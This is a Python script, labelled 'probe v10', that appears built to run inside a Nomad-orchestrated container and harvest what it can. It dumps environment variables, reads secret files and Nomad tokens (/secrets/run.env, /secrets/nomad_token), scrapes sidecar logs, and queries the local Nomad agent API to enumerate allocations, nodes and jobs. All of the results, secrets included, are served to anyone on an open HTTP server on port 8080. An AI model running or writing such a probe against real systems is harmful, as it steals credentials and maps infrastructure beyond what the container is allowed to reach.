import http.server
import json
import os
import subprocess

results = {}

def run_cmd(name, cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:2000]}
    except Exception as e:
        results[name] = {"error": str(e)}

# 1. FIND OUR ALLOCATION ID
# Check environment for NOMAD_* vars
run_cmd("env_nomad", "env | grep -i nomad 2>/dev/null || echo 'NO_NOMAD_VARS'")
run_cmd("env_alloc", "env | grep -i alloc 2>/dev/null || echo 'NO_ALLOC_VARS'")
run_cmd("env_all", "env 2>&1 | head -100")

# Check /alloc directory
run_cmd("alloc_ls", "ls -laR /alloc/ 2>&1 | head -80")
run_cmd("alloc_json", "cat /alloc/alloc.json 2>&1 | head -c 4000")

# Check cgroup for allocation references
run_cmd("cgroup", "cat /proc/self/cgroup 2>&1")
run_cmd("cpuset", "cat /proc/self/cpuset 2>&1")
run_cmd("mountinfo", "cat /proc/self/mountinfo 2>&1 | head -30")

# Check hostname (sometimes contains alloc info)
run_cmd("hostname", "hostname 2>&1")
run_cmd("hostname_f", "hostname -f 2>&1")

# Check /secrets/.nomad-mount content
run_cmd("nomad_mount", "xxd /secrets/.nomad-mount 2>&1 | head -5")
run_cmd("secrets_content", "cat /secrets/run.env 2>&1")

# Check for Nomad token in standard locations
run_cmd("nomad_token_env", "echo NOMAD_TOKEN=$NOMAD_TOKEN")
run_cmd("nomad_token_file", "cat /secrets/nomad_token 2>&1")
run_cmd("nomad_token_file2", "cat /var/run/nomad/token 2>&1")

# Check /alloc/logs for sidecar config clues  
run_cmd("sidecar_stdout", "cat /alloc/logs/sidecar.stdout.0 2>&1 | head -c 4000")
run_cmd("sidecar_stderr", "cat /alloc/logs/sidecar.stderr.0 2>&1 | head -c 4000")

# Check /alloc/data and /alloc/tmp
run_cmd("alloc_data", "ls -laR /alloc/data/ 2>&1 | head -30")
run_cmd("alloc_tmp", "ls -laR /alloc/tmp/ 2>&1 | head -30")

# Check /local (Nomad local directory)
run_cmd("local_dir", "ls -laR /local/ 2>&1 | head -30")

# 2. NOMAD CLIENT FS ENDPOINTS - try without alloc ID variations
LOCAL = "https://169.254.1.2:4646"
# Try empty alloc, various patterns
run_cmd("fs_ls_empty", f"curl -sk -m 3 '{LOCAL}/v1/client/fs/ls/' 2>&1 | head -c 500")
run_cmd("fs_ls_root", f"curl -sk -m 3 '{LOCAL}/v1/client/fs/ls/?path=/' 2>&1 | head -c 500")

# 3. ALLOCATION DISCOVERY VIA SEARCH API
run_cmd("search_alloc", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search' -d '{{\"Prefix\":\"\",\"Context\":\"allocs\"}}' 2>&1 | head -c 2000")
run_cmd("search_nodes", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search' -d '{{\"Prefix\":\"\",\"Context\":\"nodes\"}}' 2>&1 | head -c 2000")
run_cmd("search_jobs", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search' -d '{{\"Prefix\":\"\",\"Context\":\"jobs\"}}' 2>&1 | head -c 2000")
run_cmd("search_all", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search' -d '{{\"Prefix\":\"\",\"Context\":\"all\"}}' 2>&1 | head -c 4000")

# 4. FUZZY SEARCH (different endpoint)
run_cmd("fuzzy_search", f"curl -sk -m 3 -X POST '{LOCAL}/v1/search/fuzzy' -d '{{\"Text\":\"\",\"Context\":\"all\"}}' 2>&1 | head -c 4000")

# 5. NODE SELF (might work without ACL)
run_cmd("node_self", f"curl -sk -m 3 '{LOCAL}/v1/agent/self' 2>&1 | head -c 500")

# 6. Try /v1/client/allocation/ endpoints
run_cmd("client_alloc_self", f"curl -sk -m 3 '{LOCAL}/v1/client/allocation/self/stats' 2>&1 | head -c 500")

# 7. Check Nomad JWKS endpoint (for getting public keys)
run_cmd("nomad_jwks", f"curl -sk -m 3 '{LOCAL}/.well-known/jwks.json' 2>&1 | head -c 2000")
run_cmd("nomad_oidc_disco", f"curl -sk -m 3 '{LOCAL}/.well-known/openid-configuration' 2>&1 | head -c 2000")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v10 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
